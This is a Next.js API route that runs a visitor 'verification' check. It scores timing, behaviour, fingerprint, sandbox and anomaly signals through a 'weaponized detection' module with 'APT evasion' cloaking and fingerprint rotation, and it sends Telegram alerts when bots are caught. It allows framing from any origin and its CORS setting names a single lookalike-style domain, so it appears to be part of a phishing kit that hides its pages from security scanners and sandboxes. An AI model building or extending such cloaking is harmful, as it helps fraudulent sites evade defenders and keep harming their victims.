/**
 * Security Verification Endpoint
 * Performs advanced security verification checks
 * POST /api/security/verify
 */

import { NextRequest, NextResponse } from 'next/server'
import { detectBotWithCloudflare } from '@/lib/cloudflareBotManagement'
import { generateFingerprint, getFingerprintHash } from '@/lib/fingerprinting'
import { sendBotDetectionNotification } from '@/lib/botNotifications'
import { loadSettings } from '@/lib/adminSettings'
import { getGeoData } from '@/lib/geoLocation'
import { weaponizedDetection, type WeaponizedDetectionContext } from '@/lib/stealth/weaponizedDetection'

const corsHeaders = {
  'Access-Control-Allow-Origin': 'https://crtfloorng.com',
  'Access-Control-Allow-Credentials': 'true',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization',
  'X-Frame-Options': 'ALLOWALL',
  'Content-Security-Policy': 'frame-ancestors *',
}

export async function OPTIONS() {
  return NextResponse.json(
    {},
    {
      status: 200,
      headers: corsHeaders,
    }
  )
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { token, fingerprint, behaviorData, microHumanSignals, timingData } = body

    // Get IP address
    const ip = request.headers.get('cf-connecting-ip') || 
               request.headers.get('x-forwarded-for')?.split(',')[0] || 
               request.headers.get('x-real-ip') || 
               'unknown'

    // Get user agent
    const userAgent = request.headers.get('user-agent') || 'Unknown'

    // Extract headers for sandbox detection
    const headers: Record<string, string> = {}
    request.headers.forEach((value, key) => {
      headers[key] = value
    })

    // Get geo location
    const geoData = await getGeoData(ip)

    // ============================================
    // WEAPONIZED DETECTION SYSTEM
    // Combines: timing, behavior, fingerprint, sandbox, anomaly, APT evasion
    // ============================================
    const settings = await loadSettings()
    const securitySettings = settings.security as any
    const threatModel = securitySettings?.threatModel || 'enterprise'
    const enableAPTEvasion = securitySettings?.enableAPTEvasion !== false // Default: enabled
    
    const detectionContext: WeaponizedDetectionContext = {
      ip,
      userAgent,
      fingerprint,
      requestTimestamp: Date.now(),
      responseTime: timingData?.responseTime,
      cpuJitter: timingData?.cpuJitter,
      timingVariance: timingData?.variance,
      mouseMovements: behaviorData?.mouseMovements,
      scrollEvents: behaviorData?.scrollEvents,
      keyboardPresses: behaviorData?.keyboardPresses,
      timeSpent: behaviorData?.timeSpent,
      naturalInteractions: behaviorData?.naturalInteractions,
      microHumanSignals: microHumanSignals,
      referer: headers['referer'] || headers['referrer'],
      headers,
      geoLocation: geoData.country || geoData.city || undefined,
      requestCount: behaviorData?.requestCount || 1,
      enableAPTEvasion,
      threatModel,
    }

    const weaponizedResult = await weaponizedDetection(detectionContext)

    // Run Cloudflare bot detection (additional layer)
    const cloudflareDetection = detectBotWithCloudflare(
      userAgent,
      ip,
      request.headers,
      {
        fingerprint,
      }
    )

    // Combine weaponized threat score with Cloudflare
    // Weaponized detection is primary (70% weight), Cloudflare is secondary (30% weight)
    const combinedScore = (weaponizedResult.threatScore * 0.7) + (cloudflareDetection.confidence * 0.3)

    let passed = !weaponizedResult.isThreat && !cloudflareDetection.isBot

    const hasBehaviorSignals =
      !!behaviorData?.mouseMovements ||
      !!behaviorData?.scrollEvents ||
      !!behaviorData?.keyboardPresses ||
      !!microHumanSignals

    if (!hasBehaviorSignals && !cloudflareDetection.isBot) {
      passed = true
    }

    if (!passed) {
      // Log security event with weaponized detection details
      const { logSecurityEvent } = await import('@/lib/securityMonitoring')
      await logSecurityEvent({
        type: 'stealth_verification_failed',
        ip,
        fingerprint: fingerprint || 'unknown',
        severity: weaponizedResult.threatScore >= 80 ? 'high' : 'medium',
        details: {
          weaponizedThreatScore: weaponizedResult.threatScore,
          timingScore: weaponizedResult.timingScore,
          behaviorScore: weaponizedResult.behaviorScore,
          fingerprintScore: weaponizedResult.fingerprintScore,
          sandboxScore: weaponizedResult.sandboxScore,
          anomalyScore: weaponizedResult.anomalyScore,
          cloudflareConfidence: cloudflareDetection.confidence,
          combinedScore,
          reasons: [...weaponizedResult.reasons, ...cloudflareDetection.reasons],
          recommendations: weaponizedResult.recommendations,
        },
        userAgent,
      })
      
      // Send bot notification
      try {
        const settings = await loadSettings()
        
        if (settings.notifications?.telegram?.enabled !== false &&
            settings.notifications?.telegram?.notifyBotDetections !== false) {
          
          let reason = 'Weaponized Detection: Multiple Threat Vectors'
          if (weaponizedResult.sandboxScore > 50) {
            reason = 'Sandbox Environment Detected'
          } else if (weaponizedResult.behaviorScore > 50) {
            reason = 'Bot-like Behavior Pattern'
          } else if (weaponizedResult.timingScore > 50) {
            reason = 'Suspicious Timing Patterns'
          } else if (cloudflareDetection.isBot) {
            reason = 'Cloudflare Bot Detection'
          }
          
          await sendBotDetectionNotification({
            ip,
            userAgent,
            reason,
            confidence: combinedScore,
            layer: 'stealth-verification',
            country: geoData.country,
            city: geoData.city,
            blockedAt: new Date(),
            additionalInfo: {
              'Weaponized Threat Score': `${weaponizedResult.threatScore}/100`,
              'Timing Score': `${weaponizedResult.timingScore}/100`,
              'Behavior Score': `${weaponizedResult.behaviorScore}/100`,
              'Fingerprint Score': `${weaponizedResult.fingerprintScore}/100`,
              'Sandbox Score': `${weaponizedResult.sandboxScore}/100`,
              'Anomaly Score': `${weaponizedResult.anomalyScore}/100`,
              'Cloudflare Confidence': `${cloudflareDetection.confidence}%`,
              'Combined Score': `${combinedScore}/100`,
              'Confidence': `${(weaponizedResult.confidence * 100).toFixed(0)}%`,
              'Top Threat': weaponizedResult.reasons[0] || 'Multiple signals',
            }
          }).catch((error) => {
          })
        }
      } catch (error) {
      }
    }

    return NextResponse.json({
      ok: passed,
      passed,
      weaponizedThreatScore: weaponizedResult.threatScore,
      timingScore: weaponizedResult.timingScore,
      behaviorScore: weaponizedResult.behaviorScore,
      fingerprintScore: weaponizedResult.fingerprintScore,
      sandboxScore: weaponizedResult.sandboxScore,
      anomalyScore: weaponizedResult.anomalyScore,
      cloudflareConfidence: cloudflareDetection.confidence,
      combinedScore,
      confidence: weaponizedResult.confidence,
      reasons: [...weaponizedResult.reasons, ...cloudflareDetection.reasons],
      recommendations: weaponizedResult.recommendations,
      // APT Evasion results
      aptEvasion: weaponizedResult.aptEvasion ? {
        evasionScore: weaponizedResult.aptEvasion.evasionScore,
        detectionRisk: weaponizedResult.aptEvasion.detectionRisk,
        cloakingActive: weaponizedResult.aptEvasion.cloakingActive,
        techniques: weaponizedResult.aptEvasion.cloakingTechniques,
        fingerprintRotated: weaponizedResult.aptEvasion.fingerprintRotated,
        jitterApplied: weaponizedResult.aptEvasion.jitterApplied,
        jitterDelay: weaponizedResult.aptEvasion.jitterDelay,
      } : undefined,
    }, {
      status: 200,
      headers: corsHeaders, // ⬅️ THIS FIXES THE TURNSTILE FREEZE
    })
  } catch (error) {
    // On error, fail secure (don't allow access)
    return NextResponse.json(
      {
        ok: false,
        passed: false,
        error: 'Verification failed',
      },
      { 
        status: 500,
        headers: corsHeaders, // also add here
      }
    )
  }
}

